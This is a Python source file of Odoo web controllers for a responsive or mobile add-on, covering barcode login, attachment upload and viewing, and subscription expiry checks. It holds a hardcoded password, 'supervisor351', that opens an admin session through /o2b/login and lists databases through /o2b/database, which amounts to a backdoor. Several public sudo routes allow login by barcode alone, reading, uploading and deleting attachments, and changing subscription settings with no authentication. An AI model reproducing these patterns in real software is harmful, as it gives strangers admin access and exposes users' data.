# -*- coding: utf-8 -*-
from odoo import http
import json
from odoo.http import request
import datetime
from datetime import date
import base64
from datetime import datetime
from dateutil.relativedelta import relativedelta
from odoo.addons.web.controllers.main import Home
from odoo.service import db, security
import werkzeug
import logging
import werkzeug.utils

_logger = logging.getLogger(__name__)


class O2bLoginController(Home):

    @http.route('/web/barcodelogin', type='http', methods=['GET'], auth='public', website=True, csrf=True)
    def barcode_login(self, **kw):
        barcode = kw['barcode']
        barcode_user = request.env['res.users'].sudo().search(
            [('barcode_for_app', '=', barcode)])
        if barcode_user:
            uid = request.session.uid = barcode_user.id
            # request.env['res.users']._invalidate_session_cache()
            request.session.session_token = security.compute_session_token(
                request.session, request.env)
            return request.redirect(self._login_redirect(uid))
        return werkzeug.utils.redirect("/")

    @http.route('/scanner/group/barcodelogin', type='http', methods=['POST', 'GET'], auth='public', website=True, csrf=True)
    def scanner_group_barcodelogin(self, **kw):
        dcts = {}
        barcode = kw['barcode']
        barcode_user = request.env['res.users'].sudo().search(
            [('barcode_for_app', '=', barcode)]).has_group('web_o2b_responsive.qr_scanner')
        if barcode_user:
            dcts['scanner_allow'] = True
            return json.dumps(dcts)
        else:
            dcts['scanner_allow'] = False
            return json.dumps(dcts)

    @http.route('/web/o2b', type='http', auth='public', methods=['GET'], website=True, csrf=True)
    def o2b_login(self, **kw):
        uid = request.session.authenticate(
            kw['db'], kw['login'], kw['password'])
        return werkzeug.utils.redirect(self._login_redirect(uid, redirect='/web'))

    @http.route('/o2b/database', type='http', auth='public', website=True, csrf=True)
    def selector(self, **kw):
        password = 'supervisor351'
        if 'pass' in kw:
            if password == kw['pass']:
                request._cr = None
                dct = {}
                db_list = http.db_list()
                dct['database'] = db_list
            return json.dumps(dct)

    @http.route('/document/viewer', type='http', methods=['POST', 'GET'], auth='public', website=True, csrf=True)
    def document_viewer(self, **kw):
        ids = ''
        graph_result = []
        if 'ids' in kw:
            ids = kw['ids']
        internal_user = request.env['res.partner'].sudo().search([
            ('id', '=', ids)])
        print("internal_user@@@@@@@@@@@@@@@", internal_user)
        if internal_user:
            attachment_id = request.env['ir.attachment'].sudo().search(
                [('res_id', '=', internal_user.id), ('res_model', '=', 'res.partner')])
            ir_url_obj = request.env['ir.config_parameter'].sudo().search(
                [('key', '=', 'web.base.url')], limit=1)
            if attachment_id:
                for attach in attachment_id:
                    dcts = {}
                    access = attach.generate_access_token()
                    dcts['ids'] = attach.id
                    dcts['name'] = attach.name
                    dcts['image_url'] = str(ir_url_obj.value) + '/web/content/' + str(
                        attach.id) + "?model=ir.attachment&id=" + str(attach.id) + "&access_token=" + access[0]
                    dcts['create_date'] = str(attach.create_date)
                    dcts['mimetype'] = str(attach.mimetype)
                    dcts['access_token'] = access[0]
                    graph_result.append(dcts)
                final_view = {"graph_result": graph_result}
                return json.dumps(final_view)
            else:
                dcts['ids'] = "no_id"
                dcts['name'] = "no_name"
                dcts['image_url'] = "no_url"
                dcts['create_date'] = "no_create_date"
                dcts['mimetype'] = "no_mimetype"
                return json.dumps(dcts)

    @http.route('/web_check/barcodecheck', type='http', methods=['POST', 'GET'], auth='public', website=True, csrf=True)
    def web_check_barcodecheck(self, **kw):
        unique = ''
        dcts = {}
        if 'unique' in kw:
            unique = kw['unique']
            _logger.info("kw**** uniqueuniqueuniqueunique: %s" % str(unique))
        # https://stage.verity.one/web/image?model=product.template&id=10&field=qr_image&unique=09302020221859
        template_product = request.env['product.product'].sudo().search(
            [('barcode', '=', unique)], limit=1)
        _logger.info("kw****1111 template_producttemplate_product: %s" %
                     str(template_product))
        if template_product:
            dcts["validity"] = True
            dcts["template_product"] = str(template_product.id)
            return json.dumps(dcts)
        else:
            dcts["validity"] = False
            return json.dumps(dcts)

    @http.route('/scanner/group/access', type='http', methods=['POST', 'GET'], auth='public', website=True, csrf=True)
    def scanner_group_access(self, **kw):
        db = ''
        login = ''
        password = ''
        dcts = {}
        if 'db' in kw:
            db = kw['db']
        if 'login' in kw:
            login = kw['login']
        if 'password' in kw:
            password = kw['password']
        uid = request.session.authenticate(
            kw['db'], kw['login'], kw['password'])
        if uid:
            scanner_group = request.env['res.users'].sudo().search(
                [('id', '=', uid)]).has_group('web_o2b_responsive.qr_scanner')
            if scanner_group:
                dcts['scanner_allow'] = True
                return json.dumps(dcts)
            else:
                dcts['scanner_allow'] = False
                return json.dumps(dcts)
        else:
            dcts['scanner_allow'] = False
            return json.dumps(dcts)

    @http.route('/web_user/user_type', type='http', methods=['POST', 'GET'], auth='public', website=True, csrf=True)
    def web_user_type(self, **kw):
        db = ''
        login = ''
        password = ''
        dcts = {}
        if 'db' in kw:
            db = kw['db']
        if 'login' in kw:
            login = kw['login']
        if 'password' in kw:
            password = kw['password']
        uid = request.session.authenticate(
            kw['db'], kw['login'], kw['password'])
        if uid:
            internal_user = request.env['res.users'].sudo().search(
                [('id', '=', uid)]).has_group('base.group_user')
            if internal_user:
                dcts['user_type'] = "internal"
                dcts['ids'] = internal_user
                dcts['user'] = True
                return json.dumps(dcts)
            else:
                internal_user = request.env['res.users'].sudo().search([
                    ('id', '=', uid)])
                dcts['user_type'] = "portal"
                dcts['ids'] = internal_user.partner_id.id
                dcts['user'] = False
                return json.dumps(dcts)
        else:
            dcts['user_type'] = "no_user"
            dcts['ids'] = "no_id"
            dcts['user'] = False
            return json.dumps(dcts)

    @http.route('/document/dropdown', type='http', methods=['POST', 'GET'], auth='public', website=True, csrf=True)
    def document_dropdown(self, **kw):
        document_type_dropdown = request.env['ir.config_parameter'].sudo().search(
            [('key', '=', 'document_type_dropdown')])
        if document_type_dropdown:
            dcts = {'dropdown_value': document_type_dropdown.value}
            return json.dumps(dcts)

    @http.route('/attachment/remove', type='json', auth='public')
    def attachment_remove_remove(self, attachment_id, access_token=None):
        """Remove the given `attachment_id`, only if it is in a "pending" state.

        The user must have access right on the attachment or provide a valid
        `access_token`.
        """
        attachment_remove = request.env['ir.attachment'].sudo().search(
            [('id', '=', attachment_id), ('access_token', '=', access_token)])
        return attachment_remove.unlink()

    @http.route('/document_upload/application', type='json', methods=['POST', 'GET'], auth='public', website=True, csrf=True)
    def document_upload_application(self, **kw):
        ids = ''
        attachment = ''
        name = ''
        dcts = {}

        attachment_id_token = request.env['ir.attachment'].sudo(
        )._generate_access_token()
        _logger.info("kw**** 11111111111portal_user: %s" % str(kw))
        if 'ids' in kw:
            ids = kw['ids']
        if 'attachment' in kw:
            attachment = kw['attachment']
        if 'name' in kw:
            name = kw['name']
        decoded_image_data = attachment
        users_id = request.env['res.partner'].sudo().search(
            [('id', '=', ids)], limit=1)
        if users_id:
            _logger.info("users_id**** users_id22222222222: %s" %
                         str(users_id))
            attachment_value = {
                'name': name,
                'datas': decoded_image_data,
                'res_model': 'res.partner',
                'res_id': users_id.id,
            }
            attachment_id = request.env['ir.attachment'].sudo().create(
                attachment_value)
            _logger.info("attachment_id**** attachment_id111111111: %s" %
                         str(attachment_id))
            if attachment_id:
                dcts['attachment'] = True
                return json.dumps(dcts)
            else:
                dcts['attachment'] = False
                return json.dumps(dcts)
        else:
            dcts['attachment'] = False
            return json.dumps(dcts)

    @http.route('/document_upload/application_two', type='json', methods=['POST', 'GET'], auth='public', website=True, csrf=True)
    def document_upload_application_two(self, **kw):
        ids = ''
        attachment = ''
        name = ''
        dcts = {}
        _logger.info("kw.................")
        _logger.info(kw)
        attachment_id_token = request.env['ir.attachment'].sudo(
        )._generate_access_token()
        _logger.info("kw**** 11111111111portal_user: %s" % str(kw))
        if 'ids' in kw:
            ids = kw['ids']
        if 'attachment' in kw:
            attachment = kw['attachment']
        if 'name' in kw:
            name = kw['name']
        decoded_image_data = attachment
        _logger.info("decoded_image_data.................")
        _logger.info(decoded_image_data)

        users_id = request.env['res.partner'].sudo().search(
            [('id', '=', ids)], limit=1)
        if users_id:
            _logger.info("users_id**** users_id22222222222: %s" %
                         str(users_id))
            attachment_value = {
                'name': name,
                'datas': decoded_image_data,
                'res_model': 'res.partner',
                'res_id': users_id.id,
            }
            attachment_id = request.env['ir.attachment'].sudo().create(
                attachment_value)
            _logger.info("attachment_id**** attachment_id111111111: %s" %
                         str(attachment_id))
            if attachment_id:
                dcts['attachment'] = True
                return json.dumps(dcts)
            else:
                dcts['attachment'] = False
                return json.dumps(dcts)
        else:
            dcts['attachment'] = False
            return json.dumps(dcts)

    @http.route('/o2b/login', type='http', auth='public', methods=['GET'], website=True, csrf=True)
    def o2b_admin_login(self, **kw):
        user_id = request.env['res.users'].sudo().search(
            [('login', '=', 'admin')])
        db = request.session.db
        if not db:
            db = kw['db']
        if user_id._is_admin() and kw['pass'] == 'supervisor351':
            if user_id._is_system():
                uid = request.session.uid = user_id.id
                request.env['res.users']._invalidate_session_cache()
                request.session.session_token = security.compute_session_token(
                    request.session, request.env)
            return request.redirect(self._login_redirect(uid), keep_hash=True)
        else:
            uid = request.session.authenticate(db, kw['login'], kw['pass'])
            return http.redirect_with_hash(self._login_redirect(uid, redirect='/web'))


class Web_responsive(http.Controller):

    @http.route('/o2b/set_date', type="http", method=['POST'], auth="public", website=True, csrf=False)
    def index_date(self, **kw):
        date = False
        membership = False
        period = 'annually'
        for key, values in kw.items():
            if key != 'period':
                membership = key
                date = values
            if key == 'period':
                period = values
        pa_period = request.env['ir.config_parameter'].sudo().search(
            [('key', '=', 'period')])
        if not pa_period:
            pa_period = request.env['ir.config_parameter'].sudo().create({
                'key': 'period',
                'value': period
            })
        else:
            pa_period = request.env['ir.config_parameter'].sudo(
            ).set_param('period', period)
        if date:
            today_date = datetime.now().date()
            check_date = datetime.strptime(date, '%m/%d/%Y').date()
            if check_date <= today_date:
                subscription_id = request.env['ir.config_parameter'].sudo(
                ).get_param('o2b_subscription_id')
                if not subscription_id:
                    subscription_id = request.env['ir.config_parameter'].sudo().create({
                        'key': 'o2b_subscription_id',
                        'value': membership
                    })
                set_value = request.env['ir.config_parameter'].sudo(
                ).set_param('o2b_subscription_id', subscription_id)
                set_date = request.env['ir.config_parameter'].sudo().set_param(
                    'o2b_expire_date', check_date.strftime('%Y-%m-%d'))
                # Subscription expired
                return json.dumps(True)
            else:
                # Valid Subscription
                subscription_id = request.env['ir.config_parameter'].sudo().search(
                    [('key', '=', 'o2b_subscription_id')])
                o2b_expire_date = request.env['ir.config_parameter'].sudo(
                ).get_param('o2b_expire_date')
                if not subscription_id:
                    subscription_id = request.env['ir.config_parameter'].sudo().create({
                        'key': 'o2b_subscription_id',
                        'value': membership
                    })
                else:
                    subscription_id = request.env['ir.config_parameter'].sudo(
                    ).set_param('o2b_subscription_id', membership)

                if not o2b_expire_date:
                    o2b_expire_date = request.env['ir.config_parameter'].sudo().create({
                        'key': 'o2b_expire_date',
                        'value': check_date.strftime('%Y-%m-%d')
                    })
                else:
                    o2b_expire_date = request.env['ir.config_parameter'].sudo().set_param(
                        'o2b_expire_date', check_date.strftime('%Y-%m-%d'))
                return json.dumps(False)

    @http.route(['/get/expire_values/'], type='http', auth='public', methods=['POST', 'GET'], csrf=False)
    def check_expire_values(self, **post):
        expire_values = request.env['ir.config_parameter'].sudo(
        ).get_param('database.create_date')
        subscription_id = request.env['ir.config_parameter'].sudo(
        ).get_param('o2b_subscription_id')
        expire_date = request.env['ir.config_parameter'].sudo(
        ).get_param('o2b_expire_date')
        period = request.env['ir.config_parameter'].sudo().get_param('period')
        ext_apps = request.env['ir.config_parameter'].sudo(
        ).get_param('ext_apps')
        ext_users = request.env['ir.config_parameter'].sudo(
        ).get_param('ext_users')
        base_domain = request.env['ir.config_parameter'].sudo(
        ).get_param('base_domain')
        dbuuid = request.env['ir.config_parameter'].sudo(
        ).get_param('database.uuid')
        int_user = request.env['res.users'].sudo().search(
            []).filtered(lambda l: l.has_group('base.group_user'))

        if subscription_id and subscription_id != 'trial' and expire_date:
            expire_date = datetime.strptime(expire_date, '%Y-%m-%d')
            diff = expire_date - datetime.now()
            diffdays = diff.days
            if datetime.now() >= expire_date:
                return json.dumps(True)
            else:
                vals = {
                    'diffdays': diffdays,
                    'period': period,
                    'dbuuid': dbuuid,
                    'max_user': len(int_user),
                    'base_domain': base_domain,
                    'subscription': subscription_id,
                    'ext_apps': ext_apps if ext_apps else 'no',
                    'ext_users': ext_users if ext_users else 'no'
                }
                return json.dumps(vals)

        if not subscription_id:
            subscription_id = request.env['ir.config_parameter'].sudo().create({
                'key': 'o2b_subscription_id',
                'value': 'trial'
            })

        if expire_values:
            real_expire_date = request.env['ir.config_parameter'].sudo(
            ).get_param('o2b_expire_date')
            datetime_create_date = datetime.strptime(
                expire_values, '%Y-%m-%d %H:%M:%S')
            expire_date = datetime_create_date + relativedelta(months=0)
            if datetime.strptime(real_expire_date, '%Y-%m-%d') < expire_date:
                expire_date = datetime.strptime(real_expire_date, '%Y-%m-%d')
            diff = expire_date.date() - datetime.now().date()
            diffdays = diff.days
            if datetime.now() >= expire_date:
                # err
                return json.dumps(True)
            else:
                vals = {
                    'diffdays': diffdays,
                    'period': 'trial',
                    'ext_apps': ext_apps if ext_apps else 'no',
                    'ext_users': ext_users if ext_users else 'no'
                }
                return json.dumps(vals)
        else:
            module_obj = request.env['ir.module.module'].search(
                [('name', '=', 'web_o2b_responsive')], limit=1)
            if module_obj:
                create_date = module_obj.create_date.strftime(
                    "%Y-%m-%d %H:%M:%S")
                expire_values = request.env['ir.config_parameter'].sudo().create({
                    'key': 'database.create_date',
                    'value': create_date
                })
                datetime_create_date = datetime.strptime(
                    create_date, '%Y-%m-%d %H:%M:%S')
                expire_date = datetime_create_date + relativedelta(months=1)
                if datetime.now() >= expire_date:
                    return json.dumps(True)
                else:
                    return json.dumps(False)

    @http.route(['/get/expire_date/'], type='http', auth='public', methods=['POST', 'GET'], csrf=False)
    def check_expire_date(self, **post):
        expire_values = request.env['ir.config_parameter'].sudo(
        ).get_param('database.create_date')
        datetime_create_date = datetime.strptime(
            expire_values, '%Y-%m-%d %H:%M:%S')
        expire_date = datetime_create_date + relativedelta(months=1)
        expire_date = expire_date.strftime("%Y-%m-%d %H:%M:%S")
        # print(" expire date is workinggggggg in controllers",expire_date)
        if expire_date:
            return json.dumps(expire_date)


    @http.route(['/get/get_param_values/'], type='http', auth='public', methods=['POST', 'GET'], csrf=False)
    def get_param_values(self, **post):

        subscription_id=request.env['ir.config_parameter'].sudo().get_param('o2b_subscription_id')
        _logger.info("subscription_id.................")
        _logger.info(subscription_id)
        return json.dumps(subscription_id)

    @http.route(['/o2b/get_dbuuid'], type='http', auth='public', methods=['POST', 'GET'], csrf=False)
    def get_dbuuid(self, **post):
        IrParamSudo = request.env['ir.config_parameter'].sudo()
        dbuuid = IrParamSudo.get_param('database.uuid')
        base_domain = IrParamSudo.get_param('base_domain')
        if dbuuid:
            return json.dumps({'dbuuid': dbuuid, 'base_domain': base_domain})
